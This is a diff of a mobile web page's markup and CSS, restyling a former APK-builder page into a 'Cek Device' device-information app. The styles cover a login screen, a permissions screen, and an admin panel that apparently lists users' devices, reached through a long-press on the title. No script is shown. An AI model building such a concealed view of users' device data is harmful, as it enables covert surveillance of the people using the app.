@@ -3,850 +3,1171 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Builder APK - Zam Coder</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Cek Device">
+<meta name="theme-color" content="#0a0a0a">
+<link rel="manifest" href="data:application/json,{%22name%22:%22Cek Device%22,%22short_name%22:%22CekDevice%22,%22start_url%22:%22.%22,%22display%22:%22standalone%22,%22background_color%22:%22%230a0a0a%22,%22theme_color%22:%22%230a0a0a%22}">
+<title>Cek Device</title>
 <style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap');
   :root {
-    --black: #0a0a0a; --dark: #111111; --card: #161616; --border: #252525;
-    --silver: #a8a8b3; --white: #f0f0f0; --accent: #c8c8d4; --dim: #666672;
-    --radius-sm: 6px; --radius-md: 12px; --radius-lg: 20px;
+    --bg-primary:#0a0a0a;--bg-secondary:#111111;--bg-card:#161616;
+    --bg-elevated:#1e1e1e;--border:#2a2a2a;--border-light:#333333;
+    --text-primary:#f0f0f0;--text-secondary:#a0a0a0;--text-muted:#555555;
+    --accent:#c8c8c8;--accent-bright:#ffffff;--silver:#b8b8b8;--tab-active:#e8e8e8;
   }
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body { background: var(--black); color: var(--white); font-family: 'Syne', sans-serif; min-height: 100vh; overflow-x: hidden; }
-  body::before { content: ''; position: fixed; inset: 0; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E"); pointer-events: none; z-index: 0; opacity: 0.5; }
-  body::after { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px); pointer-events: none; z-index: 0; }
-  .wrapper { position: relative; z-index: 1; max-width: 420px; margin: 0 auto; min-height: 100vh; padding: 0 0 80px; }
-  .header { padding: 32px 24px 20px; border-bottom: 1px solid var(--border); position: relative; overflow: hidden; }
-  .header::before { content: ''; position: absolute; top: -60px; right: -60px; width: 200px; height: 200px; background: radial-gradient(circle, rgba(168,168,179,0.08) 0%, transparent 70%); pointer-events: none; }
-  .header-badge { display: inline-block; font-family: 'Space Mono', monospace; font-size: 9px; letter-spacing: 3px; text-transform: uppercase; color: var(--dim); border: 1px solid var(--border); padding: 4px 10px; border-radius: 2px; margin-bottom: 14px; }
-  .header h1 { font-size: 32px; font-weight: 800; letter-spacing: -1px; line-height: 1; color: var(--white); }
-  .header h1 span { color: var(--silver); }
-  .header-sub { margin-top: 8px; font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); letter-spacing: 1px; }
-  .steps-nav { display: flex; padding: 20px 24px; gap: 6px; border-bottom: 1px solid var(--border); overflow-x: auto; scrollbar-width: none; }
-  .steps-nav::-webkit-scrollbar { display: none; }
-  .step-dot { flex: 1; height: 3px; background: var(--border); border-radius: 2px; transition: background 0.3s ease; cursor: pointer; min-width: 30px; }
-  .step-dot.active { background: var(--silver); }
-  .step-dot.done { background: var(--dim); }
-  .step-label { padding: 16px 24px 8px; display: flex; align-items: center; gap: 10px; }
-  .step-num { font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); background: var(--card); border: 1px solid var(--border); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; border-radius: 4px; flex-shrink: 0; }
-  .step-title { font-size: 13px; font-weight: 700; letter-spacing: 0.5px; color: var(--accent); text-transform: uppercase; }
-  .form-section { padding: 8px 24px; display: none; animation: fadeIn 0.3s ease; }
-  .form-section.active { display: block; }
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-  .field { margin-bottom: 18px; }
-  .field-label { font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
-  .field-label .req { color: var(--silver); font-size: 8px; }
-  .field-input { width: 100%; background: var(--card); border: 1px solid var(--border); color: var(--white); padding: 13px 16px; font-family: 'Space Mono', monospace; font-size: 12px; border-radius: var(--radius-sm); outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
-  .field-input:focus { border-color: var(--silver); box-shadow: 0 0 0 3px rgba(168,168,179,0.08); }
-  .field-input::placeholder { color: var(--dim); font-size: 11px; }
-  .field-hint { margin-top: 5px; font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); line-height: 1.5; }
-  .source-toggle { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 18px; }
-  .source-btn { background: var(--card); border: 1px solid var(--border); color: var(--silver); padding: 14px; font-family: 'Space Mono', monospace; font-size: 10px; letter-spacing: 1px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; text-align: center; transition: all 0.2s; }
-  .source-btn.active { background: var(--white); color: var(--black); border-color: var(--white); font-weight: 700; }
-  .upload-box { border: 1.5px dashed var(--border); border-radius: var(--radius-md); padding: 32px 20px; text-align: center; cursor: pointer; transition: all 0.2s; position: relative; background: var(--card); }
-  .upload-box:hover { border-color: var(--silver); background: rgba(168,168,179,0.04); }
-  .upload-box input[type="file"] { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; }
-  .upload-icon { width: 36px; height: 36px; margin: 0 auto 10px; background: var(--border); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
-  .upload-icon svg { width: 18px; height: 18px; }
-  .upload-text { font-size: 12px; color: var(--silver); font-weight: 600; }
-  .upload-sub { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); margin-top: 4px; }
-  .upload-filename { margin-top: 10px; font-family: 'Space Mono', monospace; font-size: 10px; color: var(--accent); background: rgba(168,168,179,0.08); padding: 6px 12px; border-radius: 4px; display: none; }
-  .icon-preview-wrap { display: flex; gap: 16px; align-items: flex-start; }
-  .icon-canvas-wrap { flex-shrink: 0; }
-  .icon-preview { width: 96px; height: 96px; background: var(--border); display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; cursor: pointer; transition: transform 0.2s; }
-  .icon-preview:hover { transform: scale(0.97); }
-  .icon-preview.shape-circle { border-radius: 50%; }
-  .icon-preview.shape-rounded { border-radius: 22px; }
-  .icon-preview.shape-square { border-radius: 0px; }
-  .icon-preview img { width: 100%; height: 100%; object-fit: cover; }
-  .icon-placeholder { text-align: center; pointer-events: none; }
-  .icon-placeholder svg { width: 24px; height: 24px; opacity: 0.4; }
-  .icon-placeholder p { font-size: 9px; color: var(--dim); margin-top: 4px; font-family: 'Space Mono', monospace; }
-  #iconFileInput { display: none; }
-  .icon-controls { flex: 1; display: flex; flex-direction: column; gap: 10px; }
-  .shape-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
-  .shape-btn { background: var(--card); border: 1px solid var(--border); padding: 8px 4px; border-radius: 6px; cursor: pointer; text-align: center; transition: all 0.2s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
-  .shape-btn.active { border-color: var(--silver); background: rgba(168,168,179,0.08); }
-  .shape-preview { width: 28px; height: 28px; background: var(--silver); margin: 0 auto; }
-  .shape-preview.circle { border-radius: 50%; }
-  .shape-preview.rounded { border-radius: 7px; }
-  .shape-preview.square { border-radius: 0; }
-  .shape-btn span { font-family: 'Space Mono', monospace; font-size: 8px; color: var(--dim); text-transform: uppercase; }
-  .slider-wrap { display: flex; align-items: center; gap: 10px; }
-  .slider-wrap label { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; white-space: nowrap; width: 32px; }
-  input[type="range"] { flex: 1; appearance: none; height: 2px; background: var(--border); border-radius: 2px; outline: none; cursor: pointer; }
-  input[type="range"]::-webkit-slider-thumb { appearance: none; width: 14px; height: 14px; background: var(--white); border-radius: 50%; cursor: pointer; }
-  .slider-val { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--silver); width: 28px; text-align: right; }
-  .btn-crop { width: 100%; background: transparent; border: 1px solid var(--border); color: var(--silver); padding: 9px; font-family: 'Space Mono', monospace; font-size: 9px; letter-spacing: 1.5px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 6px; }
-  .btn-crop:hover { border-color: var(--silver); background: rgba(168,168,179,0.06); }
-  .color-row { display: flex; gap: 8px; flex-wrap: wrap; }
-  .color-swatch { width: 40px; height: 40px; border-radius: 8px; cursor: pointer; border: 2px solid transparent; transition: transform 0.15s, border-color 0.15s; }
-  .color-swatch:hover { transform: scale(1.1); }
-  .color-swatch.selected { border-color: var(--white); }
-  .color-picker-wrap { display: flex; align-items: center; gap: 10px; margin-top: 12px; }
-  .color-picker-wrap label { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); text-transform: uppercase; }
-  input[type="color"] { width: 40px; height: 40px; border: 1px solid var(--border); border-radius: 8px; cursor: pointer; padding: 2px; background: var(--card); outline: none; }
-  .splash-preview-box { width: 100%; height: 80px; border-radius: var(--radius-md); margin-top: 12px; display: flex; align-items: center; justify-content: center; border: 1px solid var(--border); transition: background 0.3s; font-family: 'Space Mono', monospace; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; }
-  .info-box { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 16px; margin-bottom: 18px; }
-  .info-box-title { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--silver); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
-  .info-box-title::before { content: ''; display: inline-block; width: 6px; height: 6px; border-radius: 50%; background: var(--silver); }
-  .info-box p { font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); line-height: 1.7; }
-  .info-box p strong { color: var(--accent); }
-  .token-steps { counter-reset: ts; list-style: none; margin-top: 10px; }
-  .token-steps li { counter-increment: ts; font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); padding: 6px 0 6px 24px; position: relative; border-bottom: 1px solid var(--border); line-height: 1.5; }
-  .token-steps li:last-child { border-bottom: none; }
-  .token-steps li::before { content: counter(ts, decimal-leading-zero); position: absolute; left: 0; font-size: 8px; color: var(--silver); top: 8px; }
-  .nav-row { display: flex; gap: 10px; padding: 20px 24px 0; }
-  .btn-back { flex: 1; background: transparent; border: 1px solid var(--border); color: var(--dim); padding: 14px; font-family: 'Space Mono', monospace; font-size: 10px; letter-spacing: 1px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; transition: all 0.2s; }
-  .btn-back:hover { border-color: var(--silver); color: var(--silver); }
-  .btn-next { flex: 2; background: var(--white); border: none; color: var(--black); padding: 14px; font-family: 'Syne', sans-serif; font-size: 13px; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; transition: all 0.2s; }
-  .btn-build { width: calc(100% - 48px); margin: 20px 24px 0; background: var(--white); border: none; color: var(--black); padding: 18px; font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; }
-  .btn-build .btn-icon { width: 20px; height: 20px; }
-  .progress-overlay { display: none; position: fixed; inset: 0; background: rgba(10,10,10,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; padding: 40px; }
-  .progress-overlay.show { display: flex; }
-  .progress-title { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 6px; text-align: center; }
-  .progress-sub { font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); margin-bottom: 36px; text-align: center; letter-spacing: 1px; }
-  .progress-track { width: 100%; max-width: 320px; height: 2px; background: var(--border); border-radius: 2px; margin-bottom: 16px; overflow: hidden; }
-  .progress-bar { height: 100%; background: var(--white); border-radius: 2px; width: 0%; transition: width 0.5s ease; }
-  .progress-step-text { font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); letter-spacing: 1.5px; text-align: center; min-height: 18px; }
-  .progress-log { margin-top: 24px; width: 100%; max-width: 320px; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 14px; max-height: 160px; overflow-y: auto; scrollbar-width: none; }
-  .progress-log::-webkit-scrollbar { display: none; }
-  .log-line { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); padding: 3px 0; line-height: 1.5; border-bottom: 1px solid var(--border); opacity: 0; animation: logIn 0.3s ease forwards; }
-  @keyframes logIn { from { opacity: 0; transform: translateX(-6px); } to { opacity: 1; transform: translateX(0); } }
-  .log-line:last-child { border-bottom: none; }
-  .log-line.success { color: #a8c4a8; }
-  .log-line.warn { color: #c4b8a8; }
-  .log-line.error { color: #e8a0a0; }
-  .success-overlay { display: none; position: fixed; inset: 0; background: rgba(10,10,10,0.97); z-index: 101; flex-direction: column; align-items: center; justify-content: center; padding: 40px; }
-  .success-overlay.show { display: flex; }
-  .success-icon { width: 64px; height: 64px; background: var(--card); border: 1px solid var(--border); border-radius: 16px; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; }
-  .success-icon svg { width: 32px; height: 32px; }
-  .success-title { font-size: 26px; font-weight: 800; letter-spacing: -1px; margin-bottom: 6px; text-align: center; }
-  .success-sub { font-family: 'Space Mono', monospace; font-size: 10px; color: var(--dim); margin-bottom: 32px; text-align: center; line-height: 1.7; }
-  .btn-download { background: var(--white); color: var(--black); border: none; padding: 16px 40px; font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; display: flex; align-items: center; gap: 10px; transition: opacity 0.2s; text-decoration: none; }
-  .btn-download:hover { opacity: 0.9; }
-  .btn-reset { margin-top: 14px; background: transparent; border: 1px solid var(--border); color: var(--dim); padding: 11px 28px; font-family: 'Space Mono', monospace; font-size: 9px; letter-spacing: 2px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; transition: all 0.2s; }
-  .btn-reset:hover { border-color: var(--silver); color: var(--silver); }
-  .footer { padding: 24px; border-top: 1px solid var(--border); text-align: center; margin-top: 20px; }
-  .footer p { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); letter-spacing: 2px; text-transform: uppercase; }
-  .footer strong { color: var(--silver); }
-  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(10,10,10,0.92); z-index: 200; align-items: center; justify-content: center; padding: 20px; }
-  .modal-overlay.show { display: flex; }
-  .modal-box { background: var(--dark); border: 1px solid var(--border); border-radius: var(--radius-lg); width: 100%; max-width: 380px; padding: 24px; }
-  .modal-title { font-size: 16px; font-weight: 800; margin-bottom: 4px; }
-  .modal-sub { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); margin-bottom: 20px; letter-spacing: 1px; }
-  .crop-canvas-container { position: relative; width: 100%; height: 280px; background: var(--card); border-radius: var(--radius-md); overflow: hidden; border: 1px solid var(--border); cursor: crosshair; user-select: none; }
-  #cropCanvas { display: block; position: absolute; top: 0; left: 0; }
-  .crop-overlay-svg { position: absolute; top: 0; left: 0; pointer-events: none; }
-  .modal-row { display: flex; gap: 10px; margin-top: 16px; }
-  .btn-modal-cancel { flex: 1; background: transparent; border: 1px solid var(--border); color: var(--dim); padding: 12px; font-family: 'Space Mono', monospace; font-size: 9px; letter-spacing: 1px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; transition: all 0.2s; }
-  .btn-modal-cancel:hover { border-color: var(--silver); color: var(--silver); }
-  .btn-modal-apply { flex: 2; background: var(--white); border: none; color: var(--black); padding: 12px; font-family: 'Syne', sans-serif; font-size: 12px; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; border-radius: var(--radius-sm); cursor: pointer; }
-  .error-msg { display: none; background: rgba(180,80,80,0.1); border: 1px solid rgba(180,80,80,0.3); border-radius: var(--radius-sm); padding: 10px 14px; font-family: 'Space Mono', monospace; font-size: 10px; color: #e8a0a0; margin-bottom: 14px; line-height: 1.5; }
-  .error-msg.show { display: block; }
-  .repo-auto { background: rgba(168,168,179,0.05); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 12px 14px; display: flex; align-items: center; gap: 10px; margin-top: 4px; }
-  .repo-auto-label { font-family: 'Space Mono', monospace; font-size: 9px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; }
-  .repo-auto-value { font-family: 'Space Mono', monospace; font-size: 11px; color: var(--accent); }
-  .repo-auto-badge { margin-left: auto; background: var(--border); border-radius: 3px; padding: 2px 8px; font-family: 'Space Mono', monospace; font-size: 8px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  body{background:var(--bg-primary);color:var(--text-primary);font-family:'IBM Plex Sans',sans-serif;min-height:100vh;overflow-x:hidden;}
+
+  /* SCREENS */
+  .screen{display:none;position:fixed;inset:0;background:var(--bg-primary);z-index:999;flex-direction:column;align-items:center;justify-content:center;padding:32px 24px;}
+  .screen.active{display:flex;}
+  .screen-logo{font-family:'IBM Plex Mono',monospace;font-size:22px;font-weight:600;letter-spacing:4px;color:var(--accent-bright);text-transform:uppercase;margin-bottom:6px;}
+  .screen-sub{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--text-muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:40px;}
+
+  .auth-tabs{display:flex;border:1px solid var(--border);margin-bottom:24px;width:100%;max-width:320px;}
+  .auth-tab{flex:1;padding:10px;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:2px;text-transform:uppercase;background:none;border:none;color:var(--text-muted);cursor:pointer;transition:all 0.2s;}
+  .auth-tab.active{background:var(--bg-elevated);color:var(--accent-bright);}
+
+  .auth-form{width:100%;max-width:320px;display:flex;flex-direction:column;gap:12px;}
+  .auth-input{background:var(--bg-card);border:1px solid var(--border);color:var(--text-primary);padding:12px 14px;font-family:'IBM Plex Mono',monospace;font-size:12px;width:100%;outline:none;transition:border-color 0.2s;}
+  .auth-input:focus{border-color:var(--border-light);}
+  .auth-input::placeholder{color:var(--text-muted);}
+  .auth-btn{background:var(--bg-elevated);border:1px solid var(--border-light);color:var(--accent-bright);padding:13px;font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all 0.2s;margin-top:4px;}
+  .auth-btn:hover{background:#252525;border-color:#555;}
+  .auth-google-btn{background:none;border:1px solid var(--border);color:var(--text-secondary);padding:12px;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:8px;}
+  .auth-google-btn:hover{background:var(--bg-elevated);border-color:var(--border-light);color:var(--accent-bright);}
+  .auth-divider{display:flex;align-items:center;gap:10px;color:var(--text-muted);font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:1px;}
+  .auth-divider::before,.auth-divider::after{content:'';flex:1;height:1px;background:var(--border);}
+  .auth-error{font-family:'IBM Plex Mono',monospace;font-size:10px;color:#888;letter-spacing:1px;text-align:center;min-height:16px;}
+
+  /* PERMISSION */
+  .perm-list{width:100%;max-width:320px;display:flex;flex-direction:column;gap:10px;margin-bottom:24px;}
+  .perm-item{background:var(--bg-card);border:1px solid var(--border);padding:14px;display:flex;align-items:center;justify-content:space-between;gap:10px;}
+  .perm-name{font-size:12px;color:var(--text-secondary);flex:1;}
+  .perm-status{font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:1px;min-width:60px;text-align:center;}
+  .perm-status.waiting{color:var(--text-muted);}
+  .perm-status.granted{color:#888;}
+  .perm-status.denied{color:#555;}
+  .perm-grant-btn{background:none;border:1px solid var(--border-light);color:var(--accent);padding:6px 12px;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:1px;text-transform:uppercase;cursor:pointer;transition:all 0.2s;}
+  .perm-grant-btn:hover{background:var(--bg-elevated);}
+  .perm-grant-btn:disabled{opacity:0.3;cursor:default;}
+  .play-btn{background:var(--bg-elevated);border:1px solid var(--border-light);color:var(--accent-bright);padding:16px 48px;font-family:'IBM Plex Mono',monospace;font-size:13px;letter-spacing:3px;text-transform:uppercase;cursor:pointer;transition:all 0.2s;display:none;}
+  .play-btn:hover{background:#252525;border-color:#555;}
+  .play-btn.visible{display:block;}
+
+  /* ADMIN PANEL - USER LIST */
+  #screen-admin{overflow-y:auto;justify-content:flex-start;padding:0;}
+  .admin-header{width:100%;background:var(--bg-secondary);border-bottom:1px solid var(--border);padding:20px 24px;position:sticky;top:0;z-index:10;}
+  .admin-title{font-family:'IBM Plex Mono',monospace;font-size:14px;font-weight:600;letter-spacing:3px;color:var(--accent-bright);text-transform:uppercase;}
+  .admin-sub{font-family:'IBM Plex Mono',monospace;font-size:9px;color:var(--text-muted);letter-spacing:2px;margin-top:3px;}
+  .admin-body{width:100%;padding:16px;max-width:480px;margin:0 auto;}
+  .admin-section-label{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:2.5px;text-transform:uppercase;color:var(--text-muted);margin:16px 0 8px;}
+  .user-card{background:var(--bg-card);border:1px solid var(--border);padding:14px 16px;margin-bottom:8px;display:flex;align-items:center;gap:14px;cursor:pointer;transition:all 0.2s;}
+  .user-card:hover{background:var(--bg-elevated);border-color:var(--border-light);}
+  .user-avatar{width:36px;height:36px;background:var(--bg-elevated);border:1px solid var(--border-light);display:flex;align-items:center;justify-content:center;font-family:'IBM Plex Mono',monospace;font-size:13px;font-weight:600;color:var(--accent-bright);flex-shrink:0;text-transform:uppercase;}
+  .user-info{flex:1;}
+  .user-name{font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:600;color:var(--accent-bright);}
+  .user-meta{font-size:11px;color:var(--text-secondary);margin-top:2px;}
+  .user-device-badge{font-family:'IBM Plex Mono',monospace;font-size:9px;color:var(--text-muted);background:var(--bg-elevated);border:1px solid var(--border);padding:2px 7px;letter-spacing:1px;text-transform:uppercase;}
+  .user-arrow{color:var(--text-muted);font-size:16px;}
+  .admin-empty{text-align:center;padding:40px 20px;font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text-muted);letter-spacing:1px;}
+  .admin-close-btn{background:none;border:1px solid var(--border);color:var(--text-secondary);padding:10px 20px;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all 0.2s;margin-top:8px;}
+  .admin-close-btn:hover{background:var(--bg-elevated);color:var(--accent-bright);border-color:var(--border-light);}
+
+  /* PASSWORD MODAL */
+  .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:9999;align-items:center;justify-content:center;}
+  .modal-overlay.active{display:flex;}
+  .modal-box{background:var(--bg-card);border:1px solid var(--border-light);padding:28px 24px;width:280px;}
+  .modal-title{font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--text-secondary);margin-bottom:16px;}
+  .modal-input{background:var(--bg-primary);border:1px solid var(--border);color:var(--text-primary);padding:11px 12px;font-family:'IBM Plex Mono',monospace;font-size:12px;width:100%;outline:none;margin-bottom:12px;transition:border-color 0.2s;}
+  .modal-input:focus{border-color:var(--border-light);}
+  .modal-row{display:flex;gap:8px;}
+  .modal-btn{flex:1;background:var(--bg-elevated);border:1px solid var(--border-light);color:var(--accent-bright);padding:10px;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;transition:all 0.2s;}
+  .modal-btn:hover{background:#252525;}
+  .modal-btn.cancel{color:var(--text-muted);border-color:var(--border);}
+  .modal-err{font-family:'IBM Plex Mono',monospace;font-size:10px;color:#666;letter-spacing:1px;margin-bottom:10px;min-height:14px;}
+
+  /* VOLUME */
+  .vol-bar-wrap{position:fixed;bottom:16px;right:16px;z-index:200;background:var(--bg-card);border:1px solid var(--border);padding:10px 14px;display:flex;align-items:center;gap:10px;opacity:0;pointer-events:none;transition:opacity 0.3s;}
+  .vol-bar-wrap.show{opacity:1;pointer-events:all;}
+  .vol-label{font-family:'IBM Plex Mono',monospace;font-size:9px;color:var(--text-muted);letter-spacing:1px;}
+  .vol-slider{width:80px;accent-color:#888;}
+
+  /* STATUSBAR */
+  .statusbar{background:#000;padding:8px 16px 6px;display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:11px;color:#ccc;letter-spacing:0.5px;}
+  .statusbar-right{display:flex;gap:6px;align-items:center;}
+
+  /* HEADER */
+  .header{background:var(--bg-secondary);border-bottom:1px solid var(--border);padding:14px 16px 12px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100;}
+  .header-icon{width:36px;height:36px;background:var(--bg-elevated);border:1px solid var(--border-light);display:flex;align-items:center;justify-content:center;}
+  .header-title-wrap{position:relative;cursor:pointer;user-select:none;display:inline-block;}
+  .header-title{font-family:'IBM Plex Mono',monospace;font-size:17px;font-weight:600;letter-spacing:2px;color:var(--accent-bright);text-transform:uppercase;}
+  .header-subtitle{font-size:10px;color:var(--text-muted);letter-spacing:1px;text-transform:uppercase;font-family:'IBM Plex Mono',monospace;}
+  .header-right{margin-left:auto;}
+  .scan-btn{background:none;border:1px solid var(--border-light);color:var(--text-secondary);padding:6px 12px;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:1.5px;cursor:pointer;text-transform:uppercase;transition:all 0.2s;}
+  .scan-btn:hover,.scan-btn.scanning{background:var(--bg-elevated);color:var(--accent-bright);border-color:#555;}
+
+  /* LONG PRESS */
+  .lp-bar{position:absolute;bottom:-3px;left:0;height:2px;width:0%;background:var(--silver);transition:none;}
+
+  /* VIEWING USER BADGE */
+  .viewing-badge{background:var(--bg-elevated);border:1px solid var(--border);padding:3px 10px;font-family:'IBM Plex Mono',monospace;font-size:9px;color:var(--silver);letter-spacing:1px;text-transform:uppercase;display:none;}
+  .viewing-badge.show{display:block;}
+
+  /* TABS */
+  .tabs-wrapper{background:var(--bg-secondary);border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none;position:sticky;top:63px;z-index:99;}
+  .tabs-wrapper::-webkit-scrollbar{display:none;}
+  .tabs{display:flex;padding:0 8px;min-width:max-content;}
+  .tab{padding:10px 14px;font-family:'IBM Plex Mono',monospace;font-size:10px;font-weight:500;letter-spacing:1.5px;text-transform:uppercase;color:var(--text-muted);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.2s;white-space:nowrap;background:none;border-top:none;border-left:none;border-right:none;outline:none;}
+  .tab.active{color:var(--tab-active);border-bottom-color:var(--silver);}
+  .tab:hover:not(.active){color:var(--text-secondary);}
+
+  /* CONTENT */
+  .content{padding:16px;display:none;animation:fadeIn 0.25s ease;}
+  .content.active{display:block;}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+
+  .section-label{font-family:'IBM Plex Mono',monospace;font-size:9px;letter-spacing:2.5px;text-transform:uppercase;color:var(--text-muted);margin:20px 0 8px;padding-left:2px;}
+  .section-label:first-child{margin-top:0;}
+  .card{background:var(--bg-card);border:1px solid var(--border);margin-bottom:2px;overflow:hidden;}
+  .row{display:flex;align-items:flex-start;justify-content:space-between;padding:11px 14px;border-bottom:1px solid var(--border);gap:12px;}
+  .row:last-child{border-bottom:none;}
+  .row-label{font-size:12px;color:var(--text-secondary);font-weight:400;flex-shrink:0;min-width:120px;padding-top:1px;}
+  .row-value{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--accent);text-align:right;word-break:break-word;line-height:1.5;}
+  .row-value.highlight{color:var(--accent-bright);font-weight:500;}
+
+  .chip-header{background:var(--bg-elevated);border-bottom:1px solid var(--border);padding:14px;display:flex;align-items:center;gap:14px;}
+  .chip-logo{width:44px;height:28px;background:var(--bg-card);border:1px solid var(--border-light);display:flex;align-items:center;justify-content:center;font-family:'IBM Plex Mono',monospace;font-size:8px;color:var(--text-muted);letter-spacing:1px;}
+  .chip-name{font-family:'IBM Plex Mono',monospace;font-size:14px;font-weight:600;color:var(--accent-bright);letter-spacing:0.5px;}
+  .chip-freq{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--silver);margin-top:2px;}
+
+  .progress-wrap{padding:10px 14px 12px;border-bottom:1px solid var(--border);background:var(--bg-card);}
+  .progress-header{display:flex;justify-content:space-between;margin-bottom:6px;}
+  .progress-label{font-size:11px;color:var(--text-secondary);}
+  .progress-pct{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--accent);}
+  .progress-track{height:3px;background:var(--border);overflow:hidden;}
+  .progress-fill{height:100%;background:linear-gradient(90deg,#666 0%,#aaa 100%);transition:width 1s ease;}
+  .progress-sub{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--text-muted);margin-top:5px;}
+
+  .battery-visual{padding:20px;display:flex;align-items:center;justify-content:center;gap:20px;background:var(--bg-card);border:1px solid var(--border);margin-bottom:2px;}
